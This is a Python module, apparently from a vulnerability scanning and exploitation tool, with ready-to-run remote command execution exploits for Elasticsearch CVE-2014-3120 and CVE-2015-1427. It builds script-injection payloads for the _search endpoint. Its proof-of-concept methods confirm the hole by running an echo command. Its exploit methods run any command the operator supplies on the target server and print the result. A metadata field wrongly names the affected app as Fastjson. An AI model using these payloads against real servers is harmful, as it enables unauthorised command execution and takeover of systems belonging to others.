#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import json
from thirdparty import requests
import threading
from core.verify import verify
from module import globals
from module.md5 import random_md5
from urllib.parse import urlparse
from thirdparty.requests_toolbelt.utils import dump


class Elasticsearch():
    def __init__(self, url):
        # http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.port = self.getipport.port
        if self.port == None and r"https://" in self.url:
            self.port = 443
        elif self.port == None and r"http://" in self.url:
            self.port = 80
        if r"https://" in self.url:
            self.url = "https://" + self.hostname + ":" + str(self.port)
        if r"http://" in self.url:
            self.url = "http://" + self.hostname + ":" + str(self.port)
        self.host = self.hostname + ":" + str(self.port)
        self.headers = {
            'Host': "" + self.host,
            'Accept': '*/*',
            'Connection': 'close',
            'Accept-Language': 'en',
            'User-Agent': self.ua,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.payload_cve_2014_3120 = r'''{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":''' \
                                     r'''{"command":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec''' \
                                     r'''(\"RECOMMAND\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}'''
        self.payload_cve_2015_1427 = r'''{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"RECOMMAND\").getText()"}}}'''

    def cve_2014_3120_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Elasticsearch: CVE-2014-3120"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = self.payload_cve_2014_3120.replace("RECOMMAND", "whoami")
        self.vul_info["vul_name"] = "Elasticsearch 命令执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2014-3120"
        self.vul_info["vul_apps"] = "Fastjson"
        self.vul_info["vul_date"] = "2014-04-29"
        self.vul_info["vul_vers"] = "< 1.2"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "命令执行漏洞"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Elasticsearch 1.2之前的默认配置启用动态脚本编制，该脚本允许远程攻击者通过_search的source" \
                                    "参数执行任意MVEL表达式和Java代码。"
        self.vul_info["cre_date"] = "2021-01-21"
        self.vul_info["cre_auth"] = "zhzyker"
        self.data_send_info = r'''{ "name": "cve-2014-3120" }'''
        md = random_md5()
        cmd = "echo " + md
        self.data_rce = self.payload_cve_2014_3120.replace("RECOMMAND", cmd)
        try:
            self.request = requests.post(self.url + "/website/blog/", data=self.data_send_info, headers=self.headers,
                                         timeout=self.timeout, verify=False)
            self.req = requests.post(self.url + "/_search?pretty", data=self.data_rce, headers=self.headers,
                                         timeout=self.timeout, verify=False)
            try:
                self.r = list(json.loads(self.req.text)["hits"]["hits"])[0]["fields"]["command"][0]
            except:
                self.r = "null"
            if md in self.r:
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "] "
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2014_3120_exp(self, cmd):
        vul_name = "Elasticsearch: CVE-2014-3120"
        self.data_send_info = r'''{ "name": "cve-2014-3120" }'''
        self.data_rce = self.payload_cve_2014_3120.replace("RECOMMAND", cmd)
        try:
            self.request = requests.post(self.url + "/website/blog/", data=self.data_send_info, headers=self.headers,
                                         timeout=self.timeout, verify=False)
            self.req = requests.post(self.url + "/_search?pretty", data=self.data_rce, headers=self.headers,
                                         timeout=self.timeout, verify=False)
            try:
                self.r = list(json.loads(self.req.text)["hits"]["hits"])[0]["fields"]["command"][0]
            except:
                self.r = "null"
            raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.r, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception as e:
            verify.error_print(vul_name)

    def cve_2015_1427_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Elasticsearch: CVE-2015-1427"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = self.payload_cve_2015_1427.replace("RECOMMAND", "whoami")
        self.vul_info["vul_name"] = "Elasticsearch 命令执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2015-1427"
        self.vul_info["vul_apps"] = "Fastjson"
        self.vul_info["vul_date"] = "2015-01-31"
        self.vul_info["vul_vers"] = "< 1.3.7, < 1.4.3"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "命令执行漏洞"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Elasticsearch 1.3.8之前的Groovy脚本引擎和1.4.3之前的1.4.x中的Groovy脚本引擎允许远程攻击" \
                                    "者绕过沙盒保护机制，并通过精心制作的脚本执行任意shell命令。"
        self.vul_info["cre_date"] = "2021-01-21"
        self.vul_info["cre_auth"] = "zhzyker"
        self.data_send_info = r'''{ "name": "cve-2015-1427" }'''
        md = random_md5()
        cmd = "echo " + md
        self.data_rce = self.payload_cve_2015_1427.replace("RECOMMAND", cmd)
        self.host = self.hostname + ":" + str(self.port)
        self.headers_text = {
            'Host': "" + self.host,
            'Accept': '*/*',
            'Connection': 'close',
            'Accept-Language': 'en',
            'User-Agent': self.ua,
            'Content-Type': 'application/text'
        }
        try:
            self.request = requests.post(self.url + "/website/blog/", data=self.data_send_info, headers=self.headers,
                                         timeout=self.timeout, verify=False)
            self.req = requests.post(self.url + "/_search?pretty", data=self.data_rce, headers=self.headers_text,
                                         timeout=self.timeout, verify=False)
            try:
                self.r = list(json.loads(self.req.text)["hits"]["hits"])[0]["fields"]["lupin"][0]
            except:
                self.r = "null"
            if md in self.r:
                self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "] "
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2015_1427_exp(self, cmd):
        vul_name = "Elasticsearch: CVE-2015-1427"
        self.data_send_info = r'''{ "name": "cve-2015-1427" }'''
        self.data_rce = self.payload_cve_2015_1427.replace("RECOMMAND", cmd)
        self.host = self.hostname + ":" + str(self.port)
        self.headers_text = {
            'Host': "" + self.host,
            'Accept': '*/*',
            'Connection': 'close',
            'Accept-Language': 'en',
            'User-Agent': self.ua,
            'Content-Type': 'application/text'
        }
        try:
            self.request = requests.post(self.url + "/website/blog/", data=self.data_send_info, headers=self.headers,
                                         timeout=self.timeout, verify=False)
            self.req = requests.post(self.url + "/_search?pretty", data=self.data_rce, headers=self.headers_text,
                                         timeout=self.timeout, verify=False)
            try:
                self.r = list(json.loads(self.req.text)["hits"]["hits"])[0]["fields"]["lupin"][0]
            except IndexError:
                self.r = "null"
            raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.r, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception as e:
            verify.error_print(vul_name)

